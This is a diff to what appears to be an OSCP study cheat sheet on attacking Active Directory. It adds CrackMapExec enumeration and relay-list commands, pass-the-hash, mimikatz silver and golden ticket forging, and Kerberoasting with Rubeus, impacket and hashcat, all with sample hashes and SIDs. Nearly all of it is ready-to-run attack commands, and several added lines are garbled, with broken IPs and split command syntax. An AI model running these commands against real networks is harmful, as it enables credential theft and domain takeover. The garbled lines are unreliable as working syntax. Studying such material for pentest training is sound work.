@@ -42,6 +42,36 @@ Get-DomainUser -PreauthNotRequired -verbose # identifying AS-REP roastable accou
 
 Get-NetUser -SPN | select serviceprincipalname #Kerberoastable accounts
 ```
+###Crackmapexec
+
+```bash
+# Enumerate users
+crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --users
+
+# Perform RID Bruteforce to get users
+crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --rid-brute
+
+# Enumerate domain groups
+crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --groups
+
+# Enumerate local users
+crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --local-users
+
+# Generate a list of relayable hosts (SMB Signing disabled)
+crackmapexec smb 192.168.1.0/24 --gen-relay-list output.txt
+
+# Enumerate available shares
+crackmapexec smb 192.168.215.138 -u 'user' -p 'PASSWORD' --local-auth --shares
+
+# Get the active sessions
+crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --sessions
+
+# Check logged in users
+crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --lusers
+
+# Get the password policy
+crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --pass-pol
+```
 
 ### Bloodhound
 
@@ -114,6 +144,7 @@ sekurlsa::logonpasswords #obtain NTLM hash of the SPN account here
 
 ```bash
 crackmapexec smb 192.168.1.105 -u Administrator -H 32196B56FFE6F45E294117B91A83BF38 -x ipconfig
+        crackmapexec 192. 168.57.0/24 -u "Frank Castle" -H 64f12cddaa88057e06a81b54e73b949b -- local
 ```
 
 ### Silver Tickets
@@ -136,6 +167,7 @@ ps> whoami /user
 
 ```bash
 kerberos::golden /sid:<domainSID> /domain:<domain-name> /ptt /target:<targetsystem.domain> /service:<service-name> /rc4:<NTLM-hash> /user:<new-user>
+      mimikatz # kerberos: :golden /user:offsec /domain:corp.com /sid: S-1-5-21-4038953314-3014849035-1274281563 /target: CorpSqlServer.corp.com: 1433 /service:MSSQLSvc /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt
 exit
 
 # we can check the tickets by,
@@ -158,10 +190,30 @@ mimikatz.exe "kerberos::ptt <TICKET_FILE>"
 ### Golden Ticket Ft **Mimikatz**
 
 ```bash
+#using krbtgt hash via mimikatz
 kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
+        mimikatz # kerberos :: golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-4038953314-3014849035-1274281563 /krbtgt:fc274a94b36874d2560a7bd332604fab /ptt
+#using krbtgt hash via Rubeus
 .\Rubeus.exe ptt /ticket:ticket.kirbi
 klist #List tickets in memory
 
 # Example using aes key
 kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
+
+#After running above code to generate golden ticket, the golden ticket will be automaticallys ubmiited for current session
+#to launch cmd using the current session validated by golden ticket
+mimikatz # misc::cmd
+mimikatz # misc::cmd whoami
+```
+
+#Kerberoasting
+
+```bash
+#using Rubeus
+.\Rubeus.exe kerberoast /outfile:hashes.kerberoast #dumping from compromised windows host, and saving with customname
+#using GetUserSPNs.py
+GetUserSPNs.py marvel. local/fcastle: Password1 -dc-ip 192.168.57.140 -request![image](https://github.com/redcountryroad/OSCP-shortsheet/assets/166571565/be6e83fa-607b-4d55-83bd-4f1dfe1a8586)
+
+impacket-GetUserSPNs -dc-ip <DC-IP> <domain>/<user>:<pass> -request #from kali machine
+hashcat -m 13100 hashes.txt wordlist.txt --force # cracking hashes]
 ```
